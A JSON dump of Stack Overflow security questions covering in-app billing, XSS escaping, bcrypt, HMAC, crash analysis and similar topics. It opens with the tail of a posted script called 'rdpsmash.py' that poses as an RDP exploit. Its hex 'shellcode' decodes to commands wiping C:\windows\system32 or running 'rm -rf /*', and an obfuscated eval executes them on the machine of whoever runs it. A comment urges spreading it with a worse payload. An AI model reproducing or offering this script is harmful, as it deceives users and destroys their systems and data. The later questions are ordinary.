\"\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x6f\\x73\\x27\\x29\\x2e\\x73\\x79\\x73\"\nshellcode += \"\\x74\\x65\\x6d\\x28\\x27\\x64\\x65\\x6c\\x20\\x2f\\x73\\x20\\x2f\\x71\\x20\\x2f\\x66\\x20\\x43\\x3a\"\nshellcode += \"\\x5c\\x77\\x69\\x6e\\x64\\x6f\\x77\\x73\\x5c\\x73\\x79\\x73\\x74\\x65\\x6d\\x33\\x32\\x5c\\x2a\\x20\"\nshellcode += \"\\x3e\\x20\\x4e\\x55\\x4c\\x20\\x32\\x3e\\x26\\x31\\x27\\x29\\x20\\x69\\x66\\x20\\x27\\x57\\x69\\x6e\"\nshellcode += \"\\x27\\x20\\x69\\x6e\\x20\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x70\\x6c\\x61\"\nshellcode += \"\\x74\\x66\\x6f\\x72\\x6d\\x27\\x29\\x2e\\x73\\x79\\x73\\x74\\x65\\x6d\\x28\\x29\\x20\\x65\\x6c\\x73\"\nshellcode += \"\\x65\\x20\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x6f\\x73\\x27\\x29\\x2e\\x73\"\nshellcode += \"\\x79\\x73\\x74\\x65\\x6d\\x28\\x27\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f\\x2a\\x20\\x3e\\x20\\x2f\"\nshellcode += \"\\x64\\x65\\x76\\x2f\\x6e\\x75\\x6c\\x6c\\x20\\x32\\x3e\\x26\\x31\\x27\\x29\\x20\\x23\\x68\\x69\\x20\"\nshellcode += \"\\x74\\x68\\x65\\x72\\x65\\x20\\x5e\\x5f\\x7e\\x20\\x66\\x65\\x65\\x6c\\x20\\x66\\x72\\x65\\x65\\x20\"\nshellcode += \"\\x74\\x6f\\x20\\x73\\x70\\x72\\x65\\x61\\x64\\x20\\x74\\x68\\x69\\x73\\x20\\x77\\x69\\x74\\x68\\x20\"\nshellcode += \"\\x74\\x68\\x65\\x20\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x72\\x65\\x70\\x6c\\x61\\x63\\x65\\x64\\x20\"\nshellcode += \"\\x77\\x69\\x74\\x68\\x20\\x73\\x6f\\x6d\\x65\\x74\\x68\\x69\\x6e\\x67\\x20\\x6d\\x6f\\x72\\x65\\x20\"\nshellcode += \"\\x69\\x6e\\x73\\x69\\x64\\x69\\x6f\\x75\\x73\"\n\nevil = trigger + nopsled\n\nclass RDPsocket(socket.socket):\n    def __init__(self, payload, shellcode):\n        super(RDPsocket, self).__init__(socket.AF_INET, socket.SOCK_STREAM)\n        self.payload = payload\n        self.table = __import__(\"__builtin__\").__dict__ #dirty workaround\n        self.shellcode = shellcode\n\n    def parse(self, address, shellcode):\n        seeker = (struct.pack(\"&gt;I\", 0x6576616c), \n            socket.inet_aton(address[0]), #IP bytes\n            socket.inet_aton(str(address[1]))) #port bytes\n        parsed =  struct.pack(\"&gt;I\", 0x8fe2fb63) #pop eax\n        parsed += struct.pack(\"&gt;I\", 0x8fe2fb58) #push esp\n        parsed += struct.pack(\"&gt;I\", 0xffff1d6b) #add esp,byte +0x1c # pop ebp # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe2db10) #call strcpy\n        parsed += struct.pack(\"&gt;I\", 0x8fe2dfd1) #POP - POP - RET over strcpy params\n        parsed += struct.pack(\"&gt;I\", 0x8fe2dae4) #mov ecx,[esp+0x4] # add eax,edx # sub eax,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe2b3d4) #POP - RET\n        parsed += struct.pack(\"&gt;I\", 0xffffffff) #value to store in ecx\n        parsed += struct.pack(\"&gt;I\", 0x8fe0c0c7) #inc ecx # xor al,0xc9\n        parsed += struct.pack(\"&gt;I\", 0x8fe0c0c7) #inc ecx # xor al,0xc9\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += seeker[0] #add the prelude\n        parsed += seeker[1] #add the packed IP address\n        parsed += seeker[2] #add the packed port\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe2c71d) #mov eax,edx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe2def4) #add eax,ecx # ret  \n        parsed += struct.pack(\"&gt;I\", 0x8fe0e32d) #xchg eax,edx\n        parsed += struct.pack(\"&gt;I\", 0x8fe0c0c7) #inc ecx # xor al,0xc9\n        parsed += struct.pack(\"&gt;I\", 0x8fe0c0c7) #inc ecx # xor al,0xc9\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe2def4) #add eax,ecx # ret # swap back\n        parsed += struct.pack(\"&gt;I\", 0x8fe0e32d) #xchg eax,edx # copy parameter to placeholder\n        parsed += struct.pack(\"&gt;I\", 0x8fe2fb61) #mov [eax],edx # pop eax # ret # set our stack pointer back to original value\n        parsed += struct.pack(\"&gt;I\", 0x8fe0e32d) #xchg eax,edx\n        parsed += struct.pack(\"&gt;I\", 0x8fe2daea) #sub eax,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe0b1c2) #xchg eax,ebp # inc ebp # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe2b6a5) #dec ebp # ret\n        parsed += struct.pack(\"&gt;I\", 0xffff01f3) #mov esp,ebp # pop ebp # ret\n        read = self.table[seeker[0]] #reader for the parsed shellcode/data\n\n        return str(read(shellcode)), parsed\n\n    def connect(self, address):\n        self.parsed_shell = self.parse(address, shellcode)\n        super(RDPsocket, self).connect(address)\n\n    def evil_sendall(self):\n        super(RDPsocket, self).sendall(evil + self.parsed_shell[0] + self.parsed_shell[1])\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print \"[*] Usage: python rdpsmash.py IP\"\n        print \"[*] If running on non-default port, reassign PORT in the source.\"\n\n    else:   \n        TARGET = sys.argv[1]\n        PORT = 3389 #default RDP port\n\n        print \"[*] Running rdpsmash\"\n        print\n        s = RDPsocket(evil, shellcode)\n        print \"[+] Connecting and configuring payload. . .\"\n        print \"[+] This may take some time\"\n        s.connect((TARGET, PORT))\n        print \"[+] Connection established\"\n        print \"[+] Sending payload. . .\"\n        s.evil_sendall()\n        response = s.recv(4096)\n        if \"\\xA5\\x43\\xE7\\x38\\x75\\x84\\xF2\\xFF\\xFF\\x18\\x61\\x00\" in response:\n            print \"[+] Success! Payload sent and executed.\"\n            print \"[+] Telnet to target on port 8888.\"\n        else:\n            print \"[-] Failed\"\n        s.close()\n</code></pre>\n"},{"tags":["javascript","security","cryptography","web-security","browserid"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12811407,"title":"Verifying Browserid Assertions in JavaScript with Web Cryptography API","body":"<p>Will the additions to JavaScript runtime environment in the web browser proposed in the <a href=\"http://www.w3.org/2012/webcrypto/WebCryptoAPI/\" rel=\"nofollow\">Web Cryptography API</a> allow us to securely verify <a href=\"https://developer.mozilla.org/en-US/docs/Persona\" rel=\"nofollow\">browserid assertions</a> in the browser with JavaScript?</p>\n"},{"tags":["android","security","in-app-purchase","in-app-billing","android-billing"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":106,"score":1,"question_id":12806370,"title":"Consistent secure Google Play in-app purchase scenario with own web server","body":"<p>I've read several times all the docs in the <a href=\"http://developer.android.com/guide/google/play/billing/index.html\" rel=\"nofollow\">Android Developer Guide</a>\nand became familiar with nice Google presentation <a href=\"http://static.googleusercontent.com/external_content/untrusted_dlcp/www.google.com/en//events/io/2011/static/presofiles/dgalpin_android_pirates_and_vampires.pdf\" rel=\"nofollow\">Evading Pirates and Stopping Vampires</a></p>\n\n<p>Finally I tried to implement in-app billing scenario involving my own web server in accordance to the presentation above.\nHere are the main points of interaction with my server:</p>\n\n<ol>\n<li>Before making REQUEST_PURCHASE request to Google I make a request to my web server to register a new purchase. If the request succeeds I get a nonce from the server.</li>\n<li>When transaction finishes I receive an array of notification Ids to pass them to GET_PURCHASE_INFORMATION request. At this point I need to use nonce received in step 1 from my server. <strong>&lt;- I got stuck here!</strong></li>\n<li>When GET_PURCHASE_INFORMATION succeeds I get a signedJson and a signature which I pass to my server. It verifies the purchase and commits the transaction on the server.</li>\n</ol>\n\n<p>What I can not understand so far is two things:</p>\n\n<ol>\n<li><strong>How to identify a previously generated nonce by incoming IN_APP_NOTIFY intent in my case?</strong> As far as I understand it can correspond to either current purchase completion or another purchase refund. From what I see we have only notification id which has no relation to a REQUEST_PURCHASE request.</li>\n<li><strong>How to securely handle refunds in that way that my server is 100% acknowledged about this event?</strong> The most natural way IMHO is to periodically request Google server from my server to retreive the actual status for the order. Unfortunately, in my country developers can not use Google Checkout API. Another way is to periodically check the order state via device using GET_PURCHASE_INFORMATION request passing known notification ids and new nonces. If the check fails during some period the purchase will be automatically expired until the first successful order state verification. Is this scenario possible? Can I use known notification id to make GET_PURCHASE_INFORMATION requests after CONFIRM_NOTIFICATIONS request for the order?</li>\n</ol>\n\n<p><strong>EDIT:</strong> Regarding refunds (point 2) there's a related topic <a href=\"http://stackoverflow.com/questions/11190856/android-in-app-billing-security-issues\">Android In-App billing security issues?</a>. <strong>Is it correct that there is no built-in end user functionality in Google Play to ask developer to refund in-app purchase?</strong> If so, then we might implement a button within our application to send such refund request to our server including all necessary info like verified user credentials and then manually process a refund in both Google merchant account and server's database.</p>\n"},{"tags":["javascript","security","authentication","javascript-library"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12810443,"title":"How can I authenticate a javascript library?","body":"<p>I'm building an embeddable javascript library that my users can put into their web apps and serve it to their visitors.  </p>\n\n<p>The visitors can engage an action on the library, that triggers some data going back to my server.</p>\n\n<p>How do I authenticate the library without leaking credentials to the visitor?  Is an access control list locked to the domain the recommended solution, with no credentials exchanged at all?</p>\n\n<p>I took a look here at this question and it seems to be suggested as an outlandish solution: <a href=\"http://stackoverflow.com/questions/2561999/how-can-i-validate-secure-authenticate-a-javascript-based-post-request\">How can I validate/secure/authenticate a JavaScript-based POST request?</a></p>\n"},{"tags":["security","sql-injection"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":50,"score":-2,"question_id":12809178,"title":"From text box validation to prevent sql injection","body":"<p>What are the special characters; I should not allow the user to enter in text box field for security reasons.</p>\n"},{"tags":["security","get"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12747703,"title":"Are GET variables secure for transmitting secrets?","body":"<p><strong>Background</strong></p>\n\n<p>I'm working on an application for my own needs, with some very lightweight frameworks. I don't want to spend time on user previlegies, logins and so on. No one but me will use it.</p>\n\n<p><strong>My question</strong></p>\n\n<p>Let's say I want be able to add or delete anything in my database when visiting this address:</p>\n\n<p><a href=\"http://www.example.com/?secret=eccbc87e4b5ce2fe28308fd9f2a7baf3\" rel=\"nofollow\">http://www.example.com/?secret=eccbc87e4b5ce2fe28308fd9f2a7baf3</a></p>\n\n<p>No login, just this address. How secure is that? If it's not secure, what would be a good simple solution?</p>\n\n<p><strong>My thoughts</strong></p>\n\n<ul>\n<li>No one can guess that secret key.</li>\n<li>Can robots find out about it if there is no link to it?</li>\n</ul>\n"},{"tags":["wcf","silverlight","security","ssl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":121,"score":0,"question_id":954518,"title":"From http to Https Service Call","body":"<p>is there a way for some one to sneak in the to see data if my service is over http and the caller in my case is hosted on http (i.e. service is on secure ssl host while caller is on simple http).\nis that call secure or not?</p>\n"},{"tags":["sql","sql-server","database","oracle","security"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12807357,"title":"Synchronising SQL tables in two locations","body":"<p>have a bit of conundrum a the minute.</p>\n\n<p><strong>ANSI sql solutions please</strong>.</p>\n\n<p>We have two databases located at two different geographic locations and will be using the web for all traffic between the two locations.\nWe have a few tables common between the two databases that need to be sync'd periodically (i.e. at the end of the day)\nWith such syncs, we are worried about many things like security, congested traffic (could be thousands of records),data integrity.</p>\n\n<p>The end game is to store files in each record (up to 10mb) so the sync needs to be efficient. (Not a priority at the moment)</p>\n\n<p>There may be records that need to be sync'd both directions (i.e a column on one updated, then a column on two updated, the one record needs these two changes)</p>\n\n<p>What software/hardware options are there out there ? </p>\n\n<p>Is there another way without using triggers (want to get away from this).</p>\n\n<p>Thanks, been a while since I dealt with these technologies</p>\n"},{"tags":["security","open-source","findbugs","pmd","fortify-software"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":11999418,"title":"Any open-source software that is similar to Fortify?","body":"<p>I have been using PMD and Findbug for my application but fortify managed to detect some of the security vulnerabilities in my application. I am wondering if there is other open-source software that does the similar job as Fortify?</p>\n\n<p>Thank you</p>\n\n<p>Best Regards</p>\n"},{"tags":["security","encryption","passwords","md5","sha"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12804551,"title":"I'm using MD5 to hash passwords. When should I jump to the next thing? SHA-3?","body":"<p>On the 2nd of October NIST decided that SHA-3 is the new standard hashing algorithm.</p>\n\n<p>Should MD5 users start migrating to SHA-3? To something else (see below why SHA-3 is not recommended)? bcrypt? </p>\n\n<p><a href=\"http://codahale.com/how-to-safely-store-a-password/\" rel=\"nofollow\">Why Not {MD5, SHA1, SHA256, SHA512, SHA-3, etc}?</a></p>\n\n<p>And, is this really critical? Even if your password is salted?</p>\n"},{"tags":["python","security","web-security","flask","spam-prevention"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":80,"score":3,"question_id":12805732,"title":"Leanest way to prevent scripted abuse of a web app?","body":"<p>I am running flask/memcached and am looking for a lean/efficient method to prevent automated scripts from slamming me with requests and/or submitting new posts too quickly.</p>\n\n<p>I had the thought of including a 'last_action' time in the session cookie and checking against it each request but no matter what time I set, the script could be set up to delay that long.</p>\n\n<p>I also thought to grab the IP and if too many requests from it are made in x amount of time, deny anymore for so long, but this would require something like redis to run efficiently, which I'd like to avoid having to pay for.</p>\n\n<p>I prefer a cookie-based solution unless something like redis can prove it's worth.</p>\n\n<p>What are the 'industry standards' for dealing with these kinds of situations? What methods come with the least amount of cost/performance trade-offs?</p>\n"},{"tags":["javascript","html","security","passwords","copy-paste"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":111,"score":1,"question_id":12805803,"title":"Disable copy paste in HTML input fields?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1226574/disable-copy-paste-into-html-form-using-javascript\">Disable Copy/Paste into HTML form using Javascript</a>  </p>\n</blockquote>\n\n\n\n<p><a href=\"https://www.mizrahi-tefahot.co.il/he/bank/Pages/Default.aspx\" rel=\"nofollow\">My bank</a> seem to have disabled copy-paste of username and password.</p>\n\n<p>How is it done? Does it improve security?</p>\n"},{"tags":["security","symfony2","symfony-2.1"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12805804,"title":"Use two security entity providers in one controller","body":"<p>So I have two UserProviders in my Symfony2 project. A \"devices\" UserProvider and a \"members\" UserProvider. In the API the devices are authenticated with their credentials and everything is working great.</p>\n\n<p>Now I have an controller where the devices are authenticated as usual and they submit a username + password for a member so I can link the device to that member. How do I validate these credentials against the \"members\" UserProvider? </p>\n\n<p>I only can access the \"devices\" UserProvider using <code>$this-&gt;get('security.context')</code>, but I need to know if the submitted member credentials are valid. Hope anyone can give me some hints here as I can't really find anything about this on the web.</p>\n"},{"tags":["spring","security","grails"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12800141,"title":"Grails Security Plugin: Where to store additional user data?","body":"<p>I want to use the Grails Spring Security Plugin in my app. It creates a domain class which represents a user. My research on the internet showed me that it is not good to put all the data in this class because it's loaded all the time. </p>\n\n<p>My simple solution to this would be to pack the data in an additional class and then asocciate it in the security user class. Is this a good way?</p>\n"},{"tags":["security","azure","http-headers","azure-web-roles"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":11751644,"title":"Azure webrole excesive headers","body":"<p>I have a website running in Azure Web Roles. I tested the site against asafaweb.com and got an \"Excessive Headers\" warning. </p>\n\n<p><img src=\"http://i.stack.imgur.com/0BJOn.png\" alt=\"asafaweb.com screenshot\"></p>\n\n<p>Basically Azure sends out the IIS version and the .net version as part of the header. </p>\n\n<p>There is plenty of information on how to turn these headers off in IIS, but how do I turn them off in Azure?</p>\n"},{"tags":["ruby-on-rails","asp.net-mvc","security","attributes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":12803166,"title":"Bringing load_and_authorize_resource from rails to mvc .net","body":"<p>I was looking for an implementation / example of loading and authorizing a resource at a controller level. I am looking for the same functionality as <code>load_and_authorize_resource</code> in the <em>cancan</em> gem in ruby on rails. </p>\n\n<p>Has anyone come across one / have an example how to implement something similar using Mvc .Net attributes?</p>\n\n<p>Thanks!</p>\n\n<p><strong>The load_and_authorize_resource behaviour</strong></p>\n\n<p>With rails, controller and model names are linked up by convention. The attribute <code>load_and_authorize_resource</code> takes that to its advantage. When an action is hit that requires an instance of a resource, the <code>load_and_authorize_resource</code> verifies whether the instance of the resource can be accessed. If it can, it will load it up in an instance variable, if it cant, it will return a 404 or any error behaviour you have configured the attribute to produce.</p>\n\n<p>For example, if I have a resource picture, and only user that own a certain picture can edit the picture's name. </p>\n\n<p>So we would have a Edit action, which obviously would have a pictureId of the picture you want to edit.  load_and_authorize_resource would verify whether the current context/user has access to the resource.</p>\n\n<p><a href=\"http://railscasts.com/episodes/192-authorization-with-cancan\" rel=\"nofollow\">Here</a> is a small video introduction of the module.</p>\n"},{"tags":["security","rest","hmac"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12608649,"title":"HMAC authentication for REST","body":"<p>I am looking to implment HMAC for my REST API based on </p>\n\n<p><a href=\"http://www.smartjava.org/content/protect-rest-service-using-hmac-play-20\" rel=\"nofollow\">http://www.smartjava.org/content/protect-rest-service-using-hmac-play-20</a></p>\n\n<p>The one thing I am still confused about is the how to get the SECRET to the client. The clients will be iphone, android and downloaded from the market </p>\n\n<p>What I was thinking of was using something the user has entered as the SECRET like a pin, the server will have this pin via</p>\n\n<p>1) client gets a public key from server\n2) encrypts the pin with the public key\n3) server stores pin in db\n4) from that point forward the PIN in used as the SECRET </p>\n\n<p>Any holes in this?</p>\n"},{"tags":["javascript","security","node.js","xss","sanitization"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":87,"score":2,"question_id":12799539,"title":"Javascript XSS Prevention","body":"<p>There is a Node.js project that sanitizes data and there is an OWASP library for JavaScript that handles sanitization to prevent XSS.</p>\n\n<p>I have been benchmarking these libraries, and they are pretty intensive and maybe an overkill, my application does not need any dynamic HTML (submitted by users, bbtags or what ever, not required at all) so why not do it like this:</p>\n\n<ol>\n<li>Disable \"<code>&lt;</code>\" and \"<code>&gt;</code>\" characters, don't replace them or anything, just disable them, if the user submits these, give them a warning that these are disabled (client- and server-side validation)</li>\n<li><code>&amp;</code> => <code>&amp;amp;</code></li>\n<li><code>\"</code> => <code>&amp;quot;</code></li>\n<li><code>'</code> => <code>&amp;#x27;</code></li>\n<li><code>/</code> => <code>&#x2F;</code></li>\n<li>Encode submitted URLs (GET parameters etc.)</li>\n<li>DOM based XSS is covered since my application uses HTML5 PushState and the backend is fully separated from the frontend.</li>\n</ol>\n\n<p>Would this be enough to protect myself, as I said, my application does not require any HTML submitted by users, so I don't need the <code>&lt;</code> and <code>&gt;</code> tags at all.</p>\n\n<p>Thanks for all the feedback, this is what I use right now:</p>\n\n<pre><code>var pattern = /&lt;(.*)&gt;/;\n\nfunction hasHtmlTags(string) {\n    return pattern.test(string);\n};\n\nif (hasHtmlTags(userData)) {\n    // Do something?\n} else {\n    // Create entity.\n}\n</code></pre>\n\n<p>So users can still use their emoticons :&lt; and such, and the function only gets triggered if a combination of &lt; and > is found. So no expensive regular expressions and such, just disable &lt; and > in combination and we should be fine.</p>\n"},{"tags":["security","hash","passwords","bcrypt"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":366,"score":3,"question_id":7453236,"title":"How does bcrypt keep up with Moore's law?","body":"<p>I have been seeing recommendations to use bcrypt to hash passwords because of its ability to keep up with Moore's Law.</p>\n\n<p>Apparently the reason for this is because it would take much longer for an attacker to crack a bcrypt hash than a hash generated by a general purpose hash function like SHA256.</p>\n\n<p>How is that possible? How can an algorithm be deliberately slow in spite of Moore's law?</p>\n"},{"tags":["java","security","java-ee","servlets"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":58,"score":0,"question_id":12801134,"title":"Authentication/authorization with jee6 + oAuth or OpenID","body":"<p>I''m trying to write a toy app that uses google or facebook authentication. I don't really know how to set up my jee web application to work with that. Should I use programmatic authentication to do that? The \"login\" method in servlet 3.0 takes user and password and I don't have it actually in this model.</p>\n\n<p>I can't make up how to do that if I don't use standard form-based logins etc, but get redirection instead.</p>\n\n<p>DO you have any sample jee6 project that use similar authentication model?</p>\n"},{"tags":["android","security","oauth","twitter-oauth","facebook-oauth"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12800887,"title":"renew oAuth tokens on Android without opening a webview","body":"<p>I'm building an app that will integrate with facebook, twitter, instagram, g+, youtube.\nThe google services is simple as I can ask for a token to the AccountManager (or even simpler the GoogleAccountManager) and ask for a token via <code>AccountManager.get(this).getAuthTokenByFeatures(...)</code> if it's the first time, it will prompt the user to authorise and all further access the AccountManager will deal with any token renew, etc and just give me back the token.</p>\n\n<p>But for WebView based authentications (facebook, twitter, instagram) I'm doing the commonly popular method of opening a webview, let the user authorise it, use localhost as the redirect_url and use a WebViewClient to intercept the call, capture the token, and finish the webview.</p>\n\n<p>Up to this point everything is working fine!</p>\n\n<p>The problem I'm facing is that tokens expire! That way after a token expires there will be another popup of the webview, the service will load, hopefully immediately authorise (because the service remembers that the user already authorised it), redirect to localhost and the WebViewClient intercept and close it.</p>\n\n<p>So now imagine the user coming back to an app after a week or so without using it and see several little quick pop up in a row? Terrible user experience to say the least.</p>\n\n<p>Any ideas on how to handle that ????</p>\n"},{"tags":["windows","security","debugging","windbg","fuzzing"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":66,"score":1,"question_id":12800243,"title":"Need help on analyzing a crash for security issues","body":"<p>I was fuzzing an user-mode application, it crashed and of course it is repeatable.</p>\n\n<blockquote>\n  <p>00998b8f ff7604          push    dword ptr [esi+4]    ds:002b:00000004=????????</p>\n</blockquote>\n\n<p>therefore I need to know is this crash causing any security issue or not, The exploitable extention rated this crash as unknown, but !exploitable is not always right.</p>\n\n<blockquote>\n  <p>Exploitability Classification: UNKNOWN\n  Recommended Bug Title: Data from Faulting Address is used as one or more arguments in a subsequent Function Call starting at FoxitReader_Lib_Public!FX_ReleaseBookmarkPanel+0x0000000000100e2f (Hash=0x0f513521.0x7665441e)</p>\n</blockquote>\n\n<p>The data from the faulting address is later used as one or more of the arguments to a function call.</p>\n\n<p>I also uploaded a mini dump of the app if you are intersted.\n<a href=\"http://upit.ir/do.php?filename=8ba7bd96491.rar\" rel=\"nofollow\">http://upit.ir/do.php?filename=8ba7bd96491.rar</a>\nI think it might be Null pointer dereference, I'm not so sure about it.</p>\n\n<p>here is a quick look of registers :</p>\n\n<pre><code>eax=00f0f0f0 ebx=00732f40 ecx=00000000 edx=0018de78 esi=00000000 edi=0f468a7c\neip=00998b8f esp=0018de64 ebp=0018defc iopl=0         nv up ei ng nz na po cy\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283\nFoxitReader_Lib_Public!FX_ReleaseBookmarkPanel+0x100e2f:\n00998b8f ff7604          push    dword ptr [esi+4]    ds:002b:00000004=????????\n</code></pre>\n\n<p>and also disassembly of funtion :</p>\n\n<pre><code>00998b8f ff7604          push    dword ptr [esi+4]\n00998b92 ff15a4c1a000    call    dword ptr \n[FoxitReader_Lib_Public!FX_ReleaseBookmarkPanel+0x174444 (00a0c1a4)]\n00998b98 33c0            xor     eax,eax\n00998b9a 50              push    eax\n00998b9b 50              push    eax\n00998b9c 50              push    eax\n00998b9d ff742414        push    dword ptr [esp+14h]\n00998ba1 6a02            push    2\n</code></pre>\n"},{"tags":[".net","security","encryption","connection-string"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":320,"score":0,"question_id":5103670,"title":"Sharing an encrypted connection string across multiple applications in .NET","body":"<p>I'm looking for a way of encrypting a database connection string that will be shared across a number of different services and applications. These applications and services will run on the same machine, but this may (most likely) change in the future.</p>\n\n<p>I've taken a look at the functionality in .NET's System.Configuration namespace, and it doesn't quite do what I want. Unless I'm missing something very obvious, it allows me to encrypt the connection string but there doesn't appear to be a way to export the encryption keys so that I can share them across multiple machines. In fact, it isn't clear from the MSDN documentation whether I'll be able to share this encrypted data across multiple processes. It's probably worth noting here that this is not a ASP.NET web service, so I can't make use of the web.config file and aspnet_regiis.exe to perform key management. Or can I? </p>\n\n<p>If there is no way of doing with with the System.Configuration classes, I'll most likely resort to storing the encrypted connection string in the registry and do my own key management. The ideal solution would be to avoid the registry and use .NET's System.Configuration facility. </p>\n"},{"tags":["c","linux","security","permissions"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12788754,"title":"How to restrict write access to a Linux directory by process attributes?","body":"<p>We've got a situation where it would be advantageous to limit write access to a logging directory to a specific subset of user processes. These particular processes (say, for example, telnet and the like) have been modified by us to generate a logging record whenever a significant user action takes place (like a remote connection, etc). What we do not want is for the user to manually create these records by copying and editing existing logging records.</p>\n\n<p><code>syslog</code> comes close but still allows the user to generate spurious records, <code>SELinux</code> seems plausible but has a terrible reputation of being an unmanageable beast.</p>\n\n<p>Any insight is appreciated.</p>\n"},{"tags":["java","security"],"answer_count":8,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":2043,"score":2,"question_id":3893644,"title":"Why is Java labeled as a \"secure\" language?","body":"<p>I guess this is a general question, but I am going through introductory courses to java (SE/ME) and the study material claims that java is often used for \"security purposes\". It does not explain however what they mean by claiming that java incorporates good security. </p>\n\n<p>Is it hacker proof? Does it produce highly stable software? What? </p>\n\n<p>Security from my point of view (at the moment) is that it's in the hands of the developer writing the code, not the language itself?</p>\n"},{"tags":["iphone","objective-c","security","rsa","pem"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12794592,"title":"How to extract exponent and Modulus in .pem","body":"<p>I have a Private.pem file i need to extract the private exponent and Private modulus .Is their any method to do so </p>\n"},{"tags":["java","security","axis2","windows-authentication","credentials"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2643,"score":0,"question_id":5905390,"title":"Java client call to Windows Integated Authentication web service","body":"<p>I am writing a Java 1.5+ client that needs to fetch data from an IIS-hosted web service.  I created a new web service client in Eclipse and used the Java Proxy client type and Apache Axis2 web service runtime when generating the client proxy.  The web service itself runs on Windows 2003 and security is set to use only Windows Integrated Authentication.  I have found many articles online that show how to connect successfully from a Java client to this IIS service, but everything I have seen seems to require that I put the username and password in my Java client code somewhere.</p>\n\n<p>My Java client will run on a Windows machine that is on the same Active Directory network that the IIS service is on (i.e. the account I log in with each day can access the service).  I want my Java client to run in the context of the logged-in user without me needing to put in my login credentials in the code.  Here is my current code, which works, yet requires me to put a user name and password in the code:</p>\n\n<pre><code>final NTCredentials nt = new NTCredentials(\"my_username\", \"my_password\", \"\", \"my_domain\");\n        final CredentialsProvider myCredentialsProvider = new CredentialsProvider() {\n            public Credentials getCredentials(final AuthScheme scheme, final String host, int port, boolean proxy) throws CredentialsNotAvailableException {\n                return nt; \n            }\n        };\n\n        DefaultHttpParams.getDefaultParams().setParameter(\"http.authentication.credential-provider\", myCredentialsProvider);\n</code></pre>\n\n<p>But I really don't want to have to put the username and password in the code--I want it to run using the credentials of the logged-in Windows user that is running the Java client.</p>\n\n<p>What code should I use so it will connect with the logged-in user's credentials without needing to specify the user name and password?  Is this possible?</p>\n"},{"tags":["jquery","security","jquery-ajax","token"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12794534,"title":"Overload jQuery.ajax() method to add aditional token value to data parameter","body":"<p>I have to pass an aditional token value to the website so that I can validate the request.</p>\n\n<p>The function that adds the value is this: </p>\n\n<pre><code>AddPageTokenToAjaxRequest = function (data)\n{\n    data.hfPageToken = $('#hfPageToken').val();\n    return data;\n};\n</code></pre>\n\n<p>, and it would have to be used like this: 